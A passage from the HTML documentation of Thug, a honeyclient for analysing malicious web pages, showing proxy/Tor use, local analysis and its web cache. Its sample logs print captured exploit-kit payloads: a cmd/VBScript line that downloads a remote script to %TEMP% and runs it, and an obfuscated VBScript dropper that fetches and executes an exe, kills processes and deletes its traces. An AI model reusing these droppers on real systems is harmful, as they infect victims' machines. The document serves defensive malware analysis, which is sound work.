<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_24
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_23
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_22
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_21
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> ActiveXObject: javaplugin.181_20
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 7,1,0,0
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,0,64,0
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,8,1,20
</pre></div>
</div>
</div>
<div class="section" id="proxy-support">
<h2>Proxy support<a class="headerlink" href="#proxy-support" title="Permalink to this headline">¶</a></h2>
<p>Another really useful option is <em>-p (&#8211;proxy)</em> which allows to specify a proxy. Currently Thug
supports HTTP, SOCKS4 and SOCKS5 proxy using the following format</p>
<blockquote>
<div>scheme://[username:password&#64;]host:port
(supported schemes: http, socks4, socks5)</div></blockquote>
<p>This option allows Thug to make use of Tor in order to anonymize the access to a malicious
page. The trick is quite simple and requires a Tor instance up and running. Simply run Thug
using <em>socks5://127.0.0.1:9050</em> as proxy and your real IP address will not be revealed.</p>
<div class="highlight-sh"><pre>~/thug/src $ python thug.py -p socks5://127.0.0.1:9050 "http://[omitted]/main.php?page=8c6c59becaa0da07"
[2012-07-02 19:22:14] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
[2012-07-02 19:22:14] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
[2012-07-02 19:22:14] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
[2012-07-02 19:22:16] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:22:17] Saving applet Ryp.jar
[2012-07-02 19:22:17] ActiveXObject: msxml2.xmlhttp
[2012-07-02 19:22:17] ActiveXObject: acropdf.pdf
[2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
[2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
[2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
[2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
[2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
[2012-07-02 19:22:18] ActiveXObject: shockwaveflash.shockwaveflash.10
[2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
[2012-07-02 19:22:18] ActiveXObject: adodb.stream
[2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
[2012-07-02 19:22:18] ActiveXObject: shell.application
[2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
[2012-07-02 19:22:18] ActiveXObject: msxml2.xmlhttp
[2012-07-02 19:22:18] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&amp;e=2
[2012-07-02 19:22:22] [HTTP] URL: http://[omitted]/w.php?f=b081d&amp;e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:22:23] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
[2012-07-02 19:22:23] [Microsoft XMLHTTP ActiveX] send
[2012-07-02 19:22:23] [Adodb.Stream ActiveX] open
[2012-07-02 19:22:23] [Adodb.Stream ActiveX] Write
[2012-07-02 19:22:23] [Adodb.Stream ActiveX] SaveToFile (.//..//e9a458c.exe)
[2012-07-02 19:22:23] [Adodb.Stream ActiveX] Close
[2012-07-02 19:22:23] [Shell.Application ActiveX] ShellExecute command: .//..//e9a458c.exe
[2012-07-02 19:22:23] [Navigator URL Translation] ./data/ap1.php?f=b081d --&gt;  http://[omitted]/data/ap1.php?f=b081d
[2012-07-02 19:22:30] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:22:30] Microsoft Internet Explorer HCP Scheme Detected
[2012-07-02 19:22:30] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
[2012-07-02 19:22:30] [AST]: Eval argument length &gt; 64
[2012-07-02 19:22:30] [Windows Script Host Run] Command:
cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe

[2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Code:
cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
[2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
[2012-07-02 19:22:32] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:22:32] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
[2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Code:
w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
On Error resume next
c.open OT, a, z:c.send()
If c.Status = x Then
d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

[2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
[2012-07-02 19:22:38] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:22:39] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
[2012-07-02 19:22:39] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
[2012-07-02 19:22:39] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
[2012-07-02 19:22:39] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
[2012-07-02 19:22:39] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
[2012-07-02 19:22:46] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:22:46] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
[2012-07-02 19:22:46] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
[2012-07-02 19:22:46] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
[2012-07-02 19:22:46] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
[2012-07-02 19:22:46] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
[2012-07-02 19:22:49] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:22:49] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
[2012-07-02 19:22:49] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192212</pre>
</div>
</div>
<div class="section" id="local-analysis">
<h2>Local Analysis<a class="headerlink" href="#local-analysis" title="Permalink to this headline">¶</a></h2>
<p>May you need to analyze a locally saved page Thug provides the <em>-l (&#8211;local)</em> option to you.
Using such option is really simple and could turn to be really useful for testing and for
later (manual or automated) analysis (see also <em>Web Cache</em>)</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span>python thug.py -l ../samples/exploits/4042.html
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;target&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> ActiveXObject: DCE2F8B1-A520-11D4-8FD0-00D0B7730277
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> <span class="o">[</span>Yahoo! Messenger 8.x Ywcvwr ActiveX<span class="o">]</span> Server Console Overflow
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> UINT WINAPI WinExec <span class="o">(</span>
        <span class="nv">LPCSTR</span> <span class="o">=</span> <span class="nv">0x025d4b30</span> <span class="o">=</span>&gt;
                <span class="o">=</span> <span class="s2">&quot;calc.exe&quot;</span>;
        UINT <span class="nv">uCmdShow</span> <span class="o">=</span> 0;
<span class="o">)</span> <span class="o">=</span>  32;
void ExitProcess <span class="o">(</span>
        UINT <span class="nv">uExitCode</span> <span class="o">=</span> 0;
<span class="o">)</span> <span class="o">=</span>  0;

<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> Saving log analysis at ../logs/c8f4c752383eb87ac4381a4f3f101ca7/20120703001222
</pre></div>
</div>
</div>
<div class="section" id="web-cache">
<h2>Web Cache<a class="headerlink" href="#web-cache" title="Permalink to this headline">¶</a></h2>
<p>Another interesting feature which may turn to be useful for later (manual or automated) analysis
is the Web Cache. Thug stores the raw file downloaded during the analysis in a directory
named <em>/tmp/thug-cache-NNNN</em> with NNNN being the UID of the user running Thug.</p>
<div class="highlight-sh"><div class="highlight"><pre><span class="nv">$ </span><span class="nb">cd</span> /tmp/thug-cache-1000/
<span class="nv">$ </span>ls -lh
total 356K
-rw-r--r-- 1 buffer buffer  15K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,ap1.php,f<span class="o">=</span>b081d,cd73e46d5d3ac64d00553aa7393808fc
-rw-r--r-- 1 buffer buffer  25K Jul  2 19:18 <span class="o">[</span>omitted<span class="o">]</span>,data,ap2.php,39e5c34cd8c8c8791e2715c83f6a9cf3
-rw-r--r-- 1 buffer buffer 1.3K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,field.swf,0887e8c1673cec525ce8aa694192e9c7
-rw-r--r-- 1 buffer buffer 1.1K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,hcp_vbs.php,f<span class="o">=</span>b081d&amp;d<span class="o">=</span>0,eec4de0470135e1d5de7eb1a76f2624b
-rw-r--r-- 1 buffer buffer  68K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,main.php,page<span class="o">=</span>8c6c59becaa0da07,baa880d8d79c3488f2c0557be24cca6b
-rw-r--r-- 1 buffer buffer  51K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,Ryp.jar,1cc224d259fd079dc8fc964de421c9dd
-rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,e<span class="o">=</span>5&amp;f<span class="o">=</span>b081d,6aa8d9e4db0d7b4433e791c898e7090e
-rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,f<span class="o">=</span>b081d&amp;e<span class="o">=</span>2,af58f45673d97ba4643bb1c87c4505b2
</pre></div>
</div>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="sphinxsidebar">
        <div class="sphinxsidebarwrapper">
  <h3><a href="index.html">Table Of Contents</a></h3>
  <ul>
<li><a class="reference internal" href="#">Usage</a><ul>
<li><a class="reference internal" href="#basic-usage">Basic usage</a></li>
<li><a class="reference internal" href="#browser-personality">Browser personality</a></li>
<li><a class="reference internal" href="#dom-events-handling">DOM Events Handling</a></li>
<li><a class="reference internal" href="#adobe-acrobat-reader">Adobe Acrobat Reader</a></li>
<li><a class="reference internal" href="#shockwave-flash">Shockwave Flash</a></li>
<li><a class="reference internal" href="#javaplugin-and-javawebstart">JavaPlugin and JavaWebStart</a></li>
<li><a class="reference internal" href="#proxy-support">Proxy support</a></li>
<li><a class="reference internal" href="#local-analysis">Local Analysis</a></li>
<li><a class="reference internal" href="#web-cache">Web Cache</a></li>
</ul>
</li>
</ul>

  <h4>Previous topic</h4>
  <p class="topless"><a href="build.html"
                        title="previous chapter">Build and Install</a></p>
  <h4>Next topic</h4>
  <p class="topless"><a href="plugins.html"
                        title="next chapter">Plugin Framework</a></p>
  <h3>This Page</h3>
  <ul class="this-page-menu">
    <li><a href="sources/usage.txt"
           rel="nofollow">Show Source</a></li>
  </ul>
<div id="searchbox" style="display: none">
  <h3>Quick search</h3>
    <form class="search" action="search.html" method="get">
      <input type="text" name="q" />
      <input type="submit" value="Go" />
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
    <p class="searchtip" style="font-size: 90%">
    Enter search terms or a module, class or function name.
    </p>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="genindex.html" title="General Index"
             >index</a></li>
        <li class="right" >
          <a href="plugins.html" title="Plugin Framework"
             >next</a> |</li>
        <li class="right" >
          <a href="build.html" title="Build and Install"
             >previous</a> |</li>
        <li><a href="index.html">Thug 0.4.10 documentation</a> &raquo;</li> 
      </ul>
    </div>
    <div class="footer">
        &copy; Copyright 2011-2012, Angelo Dell&#39;Aera.
      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.1.2.
    </div>
  </body>
</html>